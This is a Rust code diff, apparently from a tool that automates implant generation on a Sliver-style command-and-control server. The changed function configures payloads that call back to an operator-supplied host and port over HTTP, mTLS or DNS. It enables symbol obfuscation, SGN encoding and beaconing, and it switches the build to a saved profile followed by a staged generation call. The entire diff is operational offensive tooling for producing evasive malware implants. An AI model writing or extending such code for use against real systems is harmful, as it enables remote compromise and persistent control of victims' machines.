@@ -96,32 +96,55 @@ pub async fn generate_implant(
     let c2_url = format!("{}://{}:{}", req.protocol, req.lhost, req.lport);
 
     let implant_name = req.name.clone();
-    let generate_req = clientpb::GenerateReq {
-        name: implant_name.clone(),
-        config: Some(clientpb::ImplantConfig {
-            id: format!("nw-{}", uuid::Uuid::new_v4()),
-            goos: req.goos.clone(),
-            goarch: req.goarch.clone(),
-            format: format.into(),
-            is_beacon: req.is_beacon,
-            debug: false,
-            obfuscate_symbols: true,
-            sgn_enabled: true,
-            include_http: req.protocol.starts_with("http"),
-            include_mtls: req.protocol == "mtls",
-            include_dns: req.protocol == "dns",
-            c2: vec![clientpb::ImplantC2 {
-                url: c2_url,
-                priority: 1,
-                ..Default::default()
-            }],
-            reconnect_interval: 60,
-            max_connection_errors: 100,
+    let profile_name = format!("nw_{}", Uuid::new_v4().to_string().split('-').next().unwrap_or("x"));
+
+    // Step 1: Save an implant profile
+    let profile_config = clientpb::ImplantConfig {
+        id: format!("nw-cfg-{}", Uuid::new_v4()),
+        goos: req.goos.clone(),
+        goarch: req.goarch.clone(),
+        format: format.into(),
+        is_beacon: req.is_beacon,
+        debug: false,
+        obfuscate_symbols: true,
+        sgn_enabled: true,
+        include_http: req.protocol.starts_with("http"),
+        include_mtls: req.protocol == "mtls",
+        include_dns: req.protocol == "dns",
+        c2: vec![clientpb::ImplantC2 {
+            url: c2_url,
+            priority: 1,
             ..Default::default()
-        }),
+        }],
+        reconnect_interval: 60,
+        max_connection_errors: 100,
+        ..Default::default()
     };
 
-    match conn.client.generate(tonic::Request::new(generate_req)).await {
+    // Save profile, then GenerateStage
+    let profile_save = conn.client.save_implant_profile(tonic::Request::new(
+        clientpb::ImplantProfile {
+            name: profile_name.clone(),
+            config: Some(profile_config),
+            ..Default::default()
+        }
+    )).await;
+
+    match profile_save {
+        Ok(_) => tracing::info!("Profile '{}' saved", profile_name),
+        Err(e) => tracing::warn!("Save profile failed (non-fatal): {}", e),
+    }
+
+    // Step 2: GenerateStage uses the profile
+    let gen_result = conn.client.generate_stage(tonic::Request::new(
+        clientpb::GenerateStageReq {
+            profile: profile_name,
+            name: implant_name,
+            ..Default::default()
+        }
+    )).await;
+
+    match gen_result {
         Ok(response) => {
             let out = response.into_inner();
             tracing::info!("Payload generated: {} (build_id: {})", out.implant_name, out.implant_build_id);
